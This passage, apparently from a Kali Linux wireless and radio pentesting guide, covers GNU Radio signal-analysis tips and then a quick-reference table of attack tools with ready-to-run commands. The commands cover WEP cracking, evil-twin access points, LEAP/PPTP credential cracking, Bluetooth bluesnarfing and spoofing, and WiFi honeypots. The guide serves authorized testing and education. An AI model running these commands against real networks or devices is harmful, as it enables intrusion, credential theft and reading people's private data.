# 在 GRC 中:Source(OSMOSDR/HackRF Source)→ 采样率/频率设置 → Sink(QT GUI Sink / File Sink)
```

**Practical tips**:
- Typical chain for reverse engineering proprietary protocols: gqrx finds the signal → GRC recovers/demodulates (e.g. FSK demod) → bitstream analysis → rfcat/hackrf replay.
- gr-blocks ships sub-libraries like analog/digital/filter (bpsk/qpsk/gmsk/ofdm modulations live in gr-digital).
- Generating test signals: Vector Source → modulator block → HackRF Sink; simulate with null source/sink first, no real hardware needed.
- The steepest learning curve — bring it in only when you must "reinvent the wheel"; everyday spectrum reconnaissance is fine in gqrx.

## Remaining Tools — Quick Reference

| Tool | One-line purpose | Package | Most common command |
|---|---|---|---|
| wpaclean | Extract and merge four-way handshakes from multiple pcaps | aircrack-ng (pre-installed on Kali) | `wpaclean <out.cap> <in1.cap> <in2.cap>` |
| wesside-ng | Fully automated WEP attack (auto-targets, IV generation, cracking) | aircrack-ng (pre-installed on Kali) | `sudo wesside-ng -i wlan0mon -v <bssid>` |
| makeivs-ng | Generates fake IV files containing a known key (testing/teaching) | aircrack-ng (pre-installed on Kali) | `makeivs-ng -b <bssid> -k <wep-key-hex> -w makeivs.ivs` |
| easside-ng | Clientless WEP attack (needs buddy-ng alongside) | aircrack-ng (pre-installed on Kali) | `sudo buddy-ng` then `sudo easside-ng -v <bssid> -m <mac> -s 127.0.0.1 -f wlan0mon -c 6` |
| airserv-ng | Exposes a monitor adapter as a TCP service for remote sharing | aircrack-ng (pre-installed on Kali) | `sudo airserv-ng -p 4444 -d wlan0mon -c 6` |
| airodump-ng-oui-update | Updates the IEEE OUI vendor database (so airodump shows vendors) | aircrack-ng (pre-installed on Kali) | `sudo airodump-ng-oui-update` |
| airgraph-ng | Turns airodump CSVs into AP-client relationship graphs | airgraph-ng | `airgraph-ng -i <dump>.csv -g CAPR -o <graph>.png` |
| airbase-ng | Soft AP / evil twin construction (part of the suite) | aircrack-ng (pre-installed on Kali) | `sudo airbase-ng -e <essid> -c 6 wlan0mon` |
| asleap / genkeys | Cisco LEAP/PPTP credential cracking | asleap | `genkeys -r <wordlist> -f <hash>.dat -n <hash>.idx`; `asleap -C <challenge> -R <response> -W <wordlist>` |
| bluesnarfer | Bluetooth bluesnarfing (reads phonebooks etc. over OBEX) | bluesnarfer | `sudo bluesnarfer -r 1-100 -b <bdaddr>` |
| spooftooph | Clones/forges Bluetooth device name, class code, address | spooftooph | `sudo spooftooph -i hci0 -a <bdaddr>` |
| chirp | Amateur-radio device programming (multi-vendor) | chirp | `chirp` |
| rfcat | Interactive sub-GHz transceive/reprogram (Yard Stick One etc.) | rfcat | `rfcat -r` |
| sparrow-wifi | GUI Wi-Fi analyzer (integrates hackrf/ubertooth/gpsd) | sparrow-wifi | `sudo sparrow-wifi` |
| fern-wifi-cracker | GUI automated WiFi cracking (WEP/WPA/WPS/MITM) | fern-wifi-cracker | `sudo fern-wifi-cracker` |
| wifi-honey | Auto-spawns multi-ESSID honeypots + airodump handshake capture (screen session) | wifi-honey | `sudo wifi-honey <essid> 6 wlan0` |

> This document is for penetration testing with written authorization, CTF competitions, and security education only; unauthorized testing is strictly prohibited.
